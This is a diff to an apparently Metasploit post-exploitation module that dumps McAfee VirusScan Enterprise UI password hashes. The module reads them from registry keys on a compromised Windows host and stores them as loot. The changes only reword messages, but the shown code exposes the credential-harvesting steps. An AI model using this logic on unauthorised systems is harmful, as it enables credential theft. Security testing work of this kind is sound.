@@ -21,7 +21,7 @@ class Metasploit3 < Msf::Post
       'Name'          => 'McAfee Virus Scan Enterprise Password Hashes Dump',
       'Description'   => %q(
         This module extracts the password hash from McAfee Virus Scan
-        Enterprise used to lock down the user interface.
+        Enterprise (VSE) used to lock down the user interface.
       ),
       'License'       => MSF_LICENSE,
       'Author'        => [
@@ -37,17 +37,17 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    print_status("Looking for McAfee password hashes on #{sysinfo['Computer']} ...")
+    print_status("Looking for McAfee VSE password hashes on #{sysinfo['Computer']} ...")
 
     vse_keys = enum_vse_keys
     if vse_keys.empty?
-      vprint_error("McAfee Virus Scan Enterprise not installed or insufficient permissions")
+      vprint_error("McAfee VSE not installed or insufficient permissions")
       return
     end
 
     hashes_and_versions = extract_hashes_and_versions(vse_keys)
     if hashes_and_versions.empty?
-      vprint_error("No hashes extracted")
+      vprint_error("No McAfee VSE hashes extracted")
       return
     end
     process_hashes_and_versions(hashes_and_versions)
@@ -72,13 +72,13 @@ class Metasploit3 < Msf::Post
     keys.each do |key|
       hash = registry_getvaldata(key, "UIPEx")
       if hash.empty?
-        vprint_error("No McAfee password hash found in #{key}")
+        vprint_error("No McAfee VSE password hash found in #{key}")
         next
       end
 
       version = registry_getvaldata(key, "szProductVer")
       if version.empty?
-        vprint_error("No McAfee version key found in #{key}")
+        vprint_error("No McAfee VSE version key found in #{key}")
         next
       end
       hash_map[hash] = Gem::Version.new(version)
@@ -97,11 +97,11 @@ class Metasploit3 < Msf::Post
         hashtype = 'dynamic_1405'
         version_name = 'v8'
         unless version >= VERSION_8 && version < VERSION_9
-          print_warning("Unknown McAfee version #{version} - Assuming v8")
+          print_warning("Unknown McAfee VSE version #{version} - Assuming v8")
         end
       end
 
-      print_good("McAfee #{version_name} (#{hashtype}) password hash: #{hash}")
+      print_good("McAfee VSE #{version_name} (#{hashtype}) password hash: #{hash}")
 
       credential_data = {
         post_reference_name: refname,
@@ -117,7 +117,7 @@ class Metasploit3 < Msf::Post
 
       # Store McAfee password hash as loot
       loot_path = store_loot('mcafee.hash', 'text/plain', session, "mcafee:#{hash}", 'mcafee_hashdump.txt', 'McAfee Password Hash')
-      print_status("McAfee password hash saved in: #{loot_path}")
+      print_status("McAfee VSE password hash saved in: #{loot_path}")
     end
   end
 end
